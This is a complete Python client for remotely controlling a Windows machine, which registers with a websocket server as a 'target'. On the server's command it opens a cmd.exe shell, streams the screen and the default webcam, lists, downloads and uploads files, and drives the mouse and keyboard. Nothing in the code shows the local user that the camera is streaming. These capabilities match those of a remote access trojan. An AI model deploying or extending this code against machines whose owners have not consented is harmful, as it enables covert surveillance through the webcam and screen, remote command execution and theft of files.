import argparse
import base64
import io
import json
import os
import shutil
import socket
import sys
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Any

import pyautogui
import websocket
from PIL import Image
from winpty import PtyProcess


def resolve_client_id() -> str:
    hostname = socket.gethostname().strip().replace(" ", "-")
    username = os.environ.get("USERNAME", "user").strip().replace(" ", "-")
    return f"{hostname}-{username}".lower()


def resolve_ffmpeg_path() -> str | None:
    locations = [
        Path(__file__).with_name("ffmpeg") / "ffmpeg.exe",
        Path(sys.executable).parent / "ffmpeg" / "ffmpeg.exe",
    ]
    for location in locations:
        if location.exists():
            return str(location)
    return shutil.which("ffmpeg")


class RemoteClient:
    def __init__(self, server_url: str, client_id: str):
        self.server_url = server_url
        self.client_id = client_id
        self.ws: websocket.WebSocket | None = None
        self.terminal: PtyProcess | None = None
        self.terminal_lock = threading.Lock()
        self.terminal_active = False
        self.screen_active = False
        self.camera_active = False
        self.camera_capture = None
        self.ffmpeg_requested = False
        self.ffmpeg_path = resolve_ffmpeg_path()
        self.ffmpeg_process: subprocess.Popen | None = None
        self.file_transfers: dict[str, Any] = {}

    def get_system_info(self) -> dict[str, Any]:
        return {
            "hostname": socket.gethostname(),
            "platform": "windows",
            "user": os.environ.get("USERNAME", "unknown"),
            "timestamp": datetime.utcnow().isoformat(),
        }

    def connect(self):
        self.ws = websocket.WebSocket()
        self.ws.connect(self.server_url)
        
        payload = {
            "type": "register",
            "role": "target",
            "client_id": self.client_id,
            **self.get_system_info(),
        }
        self.ws.send(json.dumps(payload))
        print(f"Conectado ao servidor: {self.server_url}")

    def start_terminal(self):
        self.stop_terminal()
        self.terminal = PtyProcess.spawn("cmd.exe", dimensions=(40, 120))
        self.terminal_active = True
        threading.Thread(target=self.read_terminal, daemon=True).start()

    def stop_terminal(self):
        self.terminal_active = False
        if self.terminal is not None and self.terminal.isalive():
            self.terminal.terminate(force=True)
        self.terminal = None

    def read_terminal(self):
        while self.terminal_active and self.terminal is not None and self.terminal.isalive():
            try:
                output = self.terminal.read(4096)
                if output and self.ws is not None:
                    self.ws.send(
                        json.dumps(
                            {
                                "type": "terminal_output",
                                "client_id": self.client_id,
                                "data": output,
                            }
                        )
                    )
            except EOFError:
                break
            except Exception as exc:
                print(f"Erro ao ler terminal: {exc}")
                break

    def write_terminal(self, data: str):
        if not self.terminal_active or not data or self.terminal is None or not self.terminal.isalive():
            return
        with self.terminal_lock:
            self.terminal.write(data)

        time.sleep(1)

    def send_screen(self):
        frame_buffer = b""
        while True:
            try:
                if not self.screen_active:
                    self.stop_ffmpeg_capture()
                    time.sleep(0.2)
                    continue

                frame_bytes = None
                if self.ffmpeg_requested and self.ffmpeg_path:
                    if self.ffmpeg_process is None:
                        self.ffmpeg_process = subprocess.Popen(
                            [
                                self.ffmpeg_path,
                                "-hide_banner",
                                "-loglevel",
                                "error",
                                "-f",
                                "gdigrab",
                                "-framerate",
                                "10",
                                "-draw_mouse",
                                "1",
                                "-i",
                                "desktop",
                                "-c:v",
                                "mjpeg",
                                "-q:v",
                                "6",
                                "-f",
                                "image2pipe",
                                "pipe:1",
                            ],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL,
                        )
                    chunk = self.ffmpeg_process.stdout.read(64 * 1024)
                    if not chunk:
                        self.stop_ffmpeg_capture()
                        continue
                    frame_buffer += chunk
                    start = frame_buffer.find(b"\xff\xd8")
                    end = frame_buffer.find(b"\xff\xd9", start + 2) if start >= 0 else -1
                    if start >= 0 and end >= 0:
                        frame_bytes = frame_buffer[start:end + 2]
                        frame_buffer = frame_buffer[end + 2:]
                else:
                    # Captura a imagem de forma otimizada usando gerenciador de contexto
                    screenshot = pyautogui.screenshot()
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format="JPEG", quality=50, optimize=True) # Reduzido a qualidade de 55 para 50 para aliviar rede
                    frame_bytes = buffer.getvalue()
                    
                    # CORREÇÃO DE MEMÓRIA: Fecha explicitamente os buffers e imagens abertas na RAM
                    buffer.close()
                    screenshot.close()

                if not frame_bytes:
                    continue

                with Image.open(io.BytesIO(frame_bytes)) as screenshot_obj:
                    width, height = screenshot_obj.size
                encoded = base64.b64encode(frame_bytes).decode("ascii")

                payload = {
                    "type": "screen",
                    "client_id": self.client_id,
                    "frame": encoded,
                    "width": width,
                    "height": height,
                }
                
                # Envia e força a limpeza de variáveis pesadas antes do próximo ciclo
                if self.ws is not None:
                    self.ws.send(json.dumps(payload))
                
                del encoded
                del payload
                
                # CORREÇÃO DE RITMO: Aumentado levemente para 0.15s para dar tempo da rede esvaziar o buffer
                time.sleep(0.15)
                
            except Exception as exc:
                print(f"Erro ao capturar tela: {exc}")
                time.sleep(1)


    def stop_ffmpeg_capture(self):
        if self.ffmpeg_process is not None and self.ffmpeg_process.poll() is None:
            self.ffmpeg_process.terminate()
        self.ffmpeg_process = None

    def handle_command(self, payload: dict):
        msg_type = payload.get("type")
        if msg_type == "command":
            command_type = payload.get("command_type")
            if command_type == "terminal_open":
                self.start_terminal()
                return
            if command_type == "terminal_close":
                self.stop_terminal()
                return
            if command_type == "terminal_input":
                self.write_terminal(str(payload.get("data", "")))
                return
            if command_type == "screen_open":
                self.screen_active = True
                self.ffmpeg_requested = bool(payload.get("use_ffmpeg", False))
                return
            if command_type == "screen_close":
                self.screen_active = False
                self.ffmpeg_requested = False
                self.stop_ffmpeg_capture()
                return
            if command_type == "camera_open":
                self.start_camera()
                return
            if command_type == "camera_close":
                self.stop_camera()
                return
            if command_type in ("file_list", "list_files"):
                threading.Thread(target=self.list_files, args=(payload,), daemon=True).start()
                return
            if command_type == "file_download":
                threading.Thread(target=self.send_file, args=(payload,), daemon=True).start()
                return
            if command_type == "file_transfer_start":
                self.start_file_transfer(payload)
                return
            if command_type == "file_transfer_chunk":
                self.write_file_transfer_chunk(payload)
                return
            if command_type == "file_transfer_end":
                self.finish_file_transfer(payload)
                return
            msg_type = command_type

        if msg_type in ("file_list", "list_files"):
            threading.Thread(target=self.list_files, args=(payload,), daemon=True).start()
            return

        if msg_type == "mouse":
            action = payload.get("action")
            x = payload.get("x")
            y = payload.get("y")
            button = payload.get("button", "left")
            if action == "move":
                pyautogui.moveTo(float(x), float(y))
            elif action == "click":
                pyautogui.moveTo(float(x), float(y))
                pyautogui.click(button=button)
            elif action == "right_click":
                pyautogui.moveTo(float(x), float(y))
                pyautogui.click(button="right")
            elif action == "double_click":
                pyautogui.moveTo(float(x), float(y))
                pyautogui.doubleClick(button=button)
            elif action == "drag":
                pyautogui.moveTo(float(x), float(y))
                pyautogui.mouseDown(button=button)
                time.sleep(0.1)
                pyautogui.mouseUp(button=button)

        elif msg_type == "keyboard":
            key = payload.get("key")
            text = payload.get("text")
            if text:
                pyautogui.typewrite(text)
            elif key:
                key_map = {
                    "ArrowUp": "up",
                    "ArrowDown": "down",
                    "ArrowLeft": "left",
                    "ArrowRight": "right",
                    "Backspace": "backspace",
                    "Delete": "delete",
                    "Enter": "enter",
                    "Escape": "esc",
                    "PageUp": "pageup",
                    "PageDown": "pagedown",
                    "Home": "home",
                    "End": "end",
                    "Tab": "tab",
                    " ": "space",
                }
                pyautogui.press(key_map.get(key, key.lower()))

        elif msg_type == "scroll":
            amount = int(payload.get("amount", 0))
            pyautogui.scroll(amount)

        elif msg_type == "shortcut":
            keys = payload.get("keys", [])
            if keys:
                pyautogui.hotkey(*keys)

    def send_client_message(self, payload: dict):
        if self.ws is not None:
            self.ws.send(json.dumps(payload))

    def start_camera(self):
        if self.camera_active:
            return
        try:
            import cv2
        except ImportError:
            self.send_client_message({
                "type": "camera_error",
                "client_id": self.client_id,
                "error": "OpenCV não está instalado no cliente.",
            })
            return
        self.camera_active = True
        threading.Thread(target=self.send_camera, args=(cv2,), daemon=True).start()

    def stop_camera(self):
        self.camera_active = False
        if self.camera_capture is not None:
            self.camera_capture.release()
            self.camera_capture = None

    def send_camera(self, cv2):
        capture = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        self.camera_capture = capture
        if not capture.isOpened():
            self.camera_active = False
            self.send_client_message({
                "type": "camera_error",
                "client_id": self.client_id,
                "error": "Não foi possível abrir a câmera padrão.",
            })
            capture.release()
            self.camera_capture = None
            return
        try:
            while self.camera_active:
                ok, frame = capture.read()
                if not ok:
                    time.sleep(0.1)
                    continue
                ok, encoded_frame = cv2.imencode(
                    ".jpg",
                    frame,
                    [int(cv2.IMWRITE_JPEG_QUALITY), 70],
                )
                if ok:
                    self.send_client_message({
                        "type": "camera",
                        "client_id": self.client_id,
                        "frame": base64.b64encode(encoded_frame.tobytes()).decode("ascii"),
                        "width": int(frame.shape[1]),
                        "height": int(frame.shape[0]),
                    })
                time.sleep(0.05)
        finally:
            capture.release()
            self.camera_capture = None

    def list_files(self, payload: dict):
        requested_path = str(payload.get("path", "")).strip()
        
        # Se for vazio, inicia na Home do usuário
        if not requested_path or requested_path == ".":
            requested_path = os.path.expanduser("~")

        result = {
            "type": "file_list_result",
            "client_id": self.client_id,
            "request_id": payload.get("request_id"),
            "path": requested_path,
            "parent_path": "",
            "entries": [],
        }
        try:
            current_path = os.path.abspath(os.path.expandvars(os.path.expanduser(requested_path)))
            parent_path = os.path.dirname(current_path)

            entries = []
            with os.scandir(current_path) as iterator:
                for entry in iterator:
                    try:
                        is_dir = entry.is_dir(follow_symlinks=False)
                        size = entry.stat().st_size if not is_dir else 0
                        entries.append({
                            "name": entry.name,
                            "path": entry.path,
                            "is_dir": is_dir,
                            "size": size,
                            "extension": os.path.splitext(entry.name)[1].lower(),
                        })
                    except Exception:
                        continue

            # Ordena diretórios primeiro e arquivos em seguida por ordem alfabética
            entries.sort(key=lambda item: (not item["is_dir"], item["name"].lower()))

            result["path"] = current_path
            result["parent_path"] = parent_path if parent_path != current_path else ""
            result["entries"] = entries

        except Exception as exc:
            result["error"] = str(exc)

        self.send_client_message(result)

    def send_file(self, payload: dict):
        path = os.path.abspath(os.path.expandvars(os.path.expanduser(str(payload.get("path", "")))))
        transfer_id = payload.get("transfer_id")
        try:
            size = os.path.getsize(path)
            self.send_client_message({
                "type": "file_transfer_start",
                "client_id": self.client_id,
                "direction": "download",
                "transfer_id": transfer_id,
                "name": os.path.basename(path),
                "size": size,
            })
            with open(path, "rb") as file_handle:
                while chunk := file_handle.read(64 * 1024):
                    self.send_client_message({
                        "type": "file_transfer_chunk",
                        "client_id": self.client_id,
                        "direction": "download",
                        "transfer_id": transfer_id,
                        "data": base64.b64encode(chunk).decode("ascii"),
                    })
            self.send_client_message({
                "type": "file_transfer_end",
                "client_id": self.client_id,
                "direction": "download",
                "transfer_id": transfer_id,
            })
        except Exception as exc:
            self.send_client_message({
                "type": "file_transfer_error",
                "client_id": self.client_id,
                "transfer_id": transfer_id,
                "error": str(exc),
            })

    def start_file_transfer(self, payload: dict):
        transfer_id = payload.get("transfer_id")
        destination_value = str(payload.get("destination", ""))
        if payload.get("install_ffmpeg") and not os.path.isabs(destination_value):
            destination = str(Path(sys.executable).parent / destination_value)
        else:
            destination = os.path.abspath(os.path.expandvars(os.path.expanduser(destination_value)))
        os.makedirs(os.path.dirname(destination), exist_ok=True)
        self.file_transfers[transfer_id] = {
            "handle": open(destination, "wb"),
            "destination": destination,
            "install_ffmpeg": payload.get("install_ffmpeg", False),
        }

    def write_file_transfer_chunk(self, payload: dict):
        transfer = self.file_transfers.get(payload.get("transfer_id"))
        if transfer is not None:
            transfer["handle"].write(base64.b64decode(payload.get("data", "")))

    def finish_file_transfer(self, payload: dict):
        transfer_id = payload.get("transfer_id")
        transfer = self.file_transfers.pop(transfer_id, None)
        if transfer is not None:
            transfer["handle"].close()
            if transfer["install_ffmpeg"]:
                self.ffmpeg_path = transfer["destination"]
        self.send_client_message({
            "type": "file_transfer_result",
            "client_id": self.client_id,
            "transfer_id": transfer_id,
            "status": "ok",
        })

    def listen(self):
        while True:
            try:
                message = self.ws.recv()
                payload = json.loads(message)

                if payload.get("type") == "command":
                    self.handle_command(payload)
                elif payload.get("type") in ("file_list", "list_files"):
                    self.list_files(payload)
                elif payload.get("type") == "ping":
                    self.ws.send(json.dumps({"type": "pong", "client_id": self.client_id}))
            except Exception as exc:
                print(f"Erro na conexão: {exc}")
                self.stop_terminal()
                time.sleep(3)
                self.connect()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Cliente remoto. Exemplo: client.exe --server ws://192.168.1.10:8000/ws"
    )
    parser.add_argument(
        "--server",
        required=True,
        help="URL do servidor websocket, ex.: ws://192.168.1.10:8000/ws"
    )
    parser.add_argument(
        "--client-id",
        default=None,
        help="Opcional. Se não informado, usa host + usuário do sistema."
    )
    args = parser.parse_args()

    client_id = args.client_id or resolve_client_id()
    print(f"Cliente: {client_id}")
    print(f"Conectando em: {args.server}")

    client = RemoteClient(args.server, client_id)
    client.connect()

    try:
        thread_screen = threading.Thread(target=client.send_screen, daemon=True)
        thread_listen = threading.Thread(target=client.listen, daemon=True)
        thread_screen.start()
        thread_listen.start()

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Cliente encerrado.")
    except Exception as exc:
        print(f"Erro fatal: {exc}")
        sys.exit(1)